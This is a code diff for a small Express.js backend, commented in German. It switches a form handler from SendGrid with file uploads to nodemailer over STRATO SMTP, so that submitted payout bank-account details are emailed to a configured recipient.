@@ -1,57 +1,49 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const sgMail = require('@sendgrid/mail');
-const multer = require('multer');
-const upload = multer({ dest: 'uploads/' }); // Speichert Uploads temporär
-
+const nodemailer = require('nodemailer');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Setze SendGrid API Key aus einer Umgebungsvariable
-sgMail.setApiKey(process.env.SENDGRID_API_KEY);
-
-// Parsen von JSON und URL-kodierten Daten
-app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-// Endpoint zum Empfangen von Formular-Daten (inkl. Datei-Uploads)
-app.post('/submit', upload.any(), async (req, res) => {
+app.post('/submit', async (req, res) => {
   try {
     const formData = req.body;
-    const files = req.files; // Array mit hochgeladenen Dateien
 
-    // E-Mail-Text zusammenbauen
-    let emailText = 'Neue Formularübermittlung:\n\n';
+    // Transporter für STRATO SMTP
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.strato.de',
+      port: 465,
+      secure: true,
+      auth: {
+        user: process.env.SENDER_EMAIL,
+        pass: process.env.SMTP_PASSWORD,
+      },
+    });
+
+    // E-Mail-Inhalt vorbereiten
+    let text = 'Neue Auszahlungskonto-Übermittlung:\n\n';
     for (let key in formData) {
-      emailText += `${key}: ${formData[key]}\n`;
+      text += `${key}: ${formData[key]}\n`;
     }
 
-    if (files && files.length > 0) {
-      emailText += '\nDateien:\n';
-      files.forEach(file => {
-        emailText += `${file.originalname} (temporär gespeichert: ${file.path})\n`;
-      });
-    }
+    // E-Mail absenden
+    const info = await transporter.sendMail({
+      from: process.env.SENDER_EMAIL,
+      to: process.env.RECEIVER_EMAIL,
+      subject: 'Neue Bankdaten vom Kunden',
+      text: text,
+    });
 
-    // E-Mail-Nachricht definieren – Absender, Empfänger und Betreff aus Umgebungsvariablen
-    const msg = {
-      to: process.env.RECEIVER_EMAIL, // Empfängeradresse (deine E-Mail)
-      from: process.env.SENDER_EMAIL,   // Absenderadresse (muss in SendGrid verifiziert sein)
-      subject: 'Neue Formularübermittlung',
-      text: emailText,
-    };
-
-    // Sende die E-Mail
-    await sgMail.send(msg);
-
-    res.status(200).json({ message: 'Formular erfolgreich gesendet!' });
+    console.log('E-Mail gesendet:', info.response);
+    res.status(200).json({ message: 'E-Mail erfolgreich gesendet.' });
   } catch (error) {
-    console.error('Fehler beim Senden der E-Mail:', error);
-    res.status(500).json({ error: 'Ein Fehler ist aufgetreten.' });
+    console.error('Fehler beim E-Mail-Versand:', error);
+    res.status(500).json({ error: 'Fehler beim E-Mail-Versand.' });
   }
 });
 
-// Einfacher Root-Endpoint zum Testen
 app.get('/', (req, res) => {
   res.send('Backend läuft!');
 });
